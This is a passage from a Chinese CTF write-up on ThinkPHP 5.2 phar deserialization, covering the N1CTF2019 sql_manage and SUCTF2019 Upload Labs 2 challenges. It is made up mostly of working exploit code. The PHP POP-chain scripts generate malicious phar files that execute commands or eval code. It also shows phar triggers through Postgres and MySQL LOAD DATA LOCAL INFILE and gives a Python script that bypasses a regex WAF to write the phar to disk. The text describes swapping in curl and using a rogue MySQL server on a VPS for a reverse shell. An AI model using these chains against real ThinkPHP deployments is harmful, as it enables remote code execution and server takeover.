                $this->data = array('Smi1e' => "$system");
            }
        }
    }
    namespace think {
        abstract class Model
        {
            use model\concern\Attribute;
            use model\concern\Conversion;
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model
        {
            public function __construct($system)
            {
                $this->get($system);
            }
        }
    }
    namespace {
        //ini_set("phar.readonly", 0);
        $Conver = new think\model\Pivot("ls");
        $payload = new think\process\pipes\Windows($Conver);
        @unlink('test.phar');
        $phar = new Phar('test.phar'); //后缀名必须为phar
        $phar->startBuffering();
        $phar->setStub('GIF89a'); //设置stub
        $phar->setMetadata($payload); //将自定义的meta-data存入manifest
        $phar->addFromString('test.txt', 'test'); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
        echo urlencode(serialize($payload));
    }
    ?>
这里我们自己在tp入口处也设一个触发点，这个poc是2019Nu1lctf中smi1e出的一道关于[mysql任意文件读取及tp5.2phar反序列化](https://www.smi1e.top/n1ctf2019-sql_manage%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/)的题目，具体我们下面会复现下。
加上test.txt，tp不会报错，不加也会触发。
其他师傅用不同的pop链也写了的poc，phar的原理都一样
    files = $files;
            }
        }
    }
    namespace think\model\concern {
        trait Conversion{
        }
        trait Attribute{
            private $withAttr;
            private $data;
        }
    }
    namespace think {
        abstract class Model{
            use model\concern\Conversion;
            use model\concern\Attribute;
            function __construct($closure)
            {
                $this->data = array("wh1t3p1g"=>[]);
                $this->withAttr = array("wh1t3p1g"=>$closure);
            }
        }
    }
    namespace think\model {
        class Pivot extends \think\Model{
            function __construct($closure)
            {
                parent::__construct($closure);
            }
        }
    }
    namespace {
        require __DIR__ . '/../vendor/autoload.php';
        $code = 'phpinfo();';
        $func = function () use ($code) {eval($code);};
        $closure = new \Opis\Closure\SerializableClosure($func);
        $pivot = new \think\model\Pivot($closure);
        $windows = new \think\process\pipes\Windows([$pivot]);
        @unlink("phar4.phar");
        $phar = new Phar("phar4.phar"); //后缀名必须为phar
        $phar->startBuffering();
        $phar->setStub("GIF89a"); //设置stub
        $phar->setMetadata($windows); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
        echo urlencode(serialize($windows));
    }
    ?>
这个POC是wh1t3p1g师傅找的，我将不需要的变量和类去掉了，易理解。
## 导致phar触发的其他地方(sql)
#### Postgres
    pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
当然，pgsqlCopyToFile和pg_trace同样也是能使用的，只是它们需要开启phar的写功能。
#### MySQL
`LOAD DATA LOCAL INFILE`也会触发phar造成反序列化，在今年的[TSec 2019 议题 PPT：Comprehensive
analysis of the mysql client attack
chain](https://paper.seebug.org/998/)，上面说的N1CTF2019
题目sql_manage考的也是这个点，我们仍然使用最上面那个例子。
    data;
            echo 'Destruct called';
        }
        }
        // $filename = 'compress.zlib://phar://phar.phar/test.txt';
        // file_get_contents($filename); 
        $m = mysqli_init();
        mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
        $s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'test', 3306);
        $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://phar.phar/test.txt\' INTO TABLE users  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;'); 
    ?>
可以看到mysql进行phar文件读取时成功触发反序列化。
下面看两道经典的mysql服务伪造结合phar反序列化的题目
## N1CTF2019 题目sql_manage
这道题给出了源码，用tp5.2写的。因为复现数据库配置做了修改，我就直接说下考点。  
**1.找数据库账号密码**
账号密码源码给出的，入口是要求我们登录数据库成功。  
**2.绕过验证码，查询sql**
验证码老梗了这是，写脚本跑出来就行，然后重点是如何构造sql语句，这里不再赘述思路了，实际考的是tp5.2pop链构造phar反序列化，所以我们需要找一个可以目录传上phar文件，然后让Mysql客户端读取文件触发反序列化。  
所以查找可写目录，为了方便复现，这里我将随机验证码去掉了。
可以看到可写目录如上，然后我们构造phar文件上传上去。配置好
    [mysqld]
    local-infile=1
    secure_file_priv="\tmp\"
    php.ini
    open_basedir=\tmp\
这里将可写目录设置如上
**3.pop链挖掘构造反序列化文件**  
这步是关于tp5.2反序列化pop链的挖掘，上篇详细讲过，这里用的就是上面写过的smi1e师傅的poc，只写下修改处，因为要打远程拿flag，命令改成curl就行了。
生成后，利用sql上传到可写目录下。
**4.正则回溯，绕waf**  
题目中放了个小waf
利用p神讲的正则回溯绕过  
将生成的phar文件内容转为16进制提出来

因为内容只能以十六进制形式传上去  
**exp**
    #coding=utf-8
    import requests
    import re 
    url = 'http://127.0.0.1:8000/query';
    a = 'a'*1000000
    data = {
        'query': "select 0x123456 into/*{}*/dumpfile '\tmp\test.phar';".format(a),
        'code': 'khpgo'
    }
    cookie = {
        'PHPSESSID':'afke2snrp6vrmm1bt8ev11avge'
    }
    html = requests.post(url=url,data=data,cookies=cookie).text
    print(html)
测试是否上传成功。
看到文件已经上传成功。
然后修改项目 把文件名改为phar格式
然后运行文件
host填写运行文件的主机ip也就是前面vps地址，账号密码随意，进去后执行任意sql触发反序列化监听vps端口反弹shell。
## SUCTF2019-Upload labs 2
题目：[https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload Labs
2](https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202)  
为了方便复现，题目环境在本地搭建  
环境条件：
    allow_url_include=On 
    开启php_fileinfo、php_soap扩展
**题目分析**  
源码在上面，为节省篇章，就看一下关键代码。  
入口文件是文件上传，只允许上传限定图片，会检测上传内容是否含有`file_name = $file_name;
        }
        function check(){
            $data = file_get_contents($this->file_name);
            if (mb_strpos($data, "<?") !== FALSE) {
                die("&lt;? in contents!");
            }
        }
    }
然后就是上传后可以查看图片类型  
func.php
    .....
    <?php
    include 'class.php';
    if (isset($_POST["submit"]) && isset($_POST["url"])) {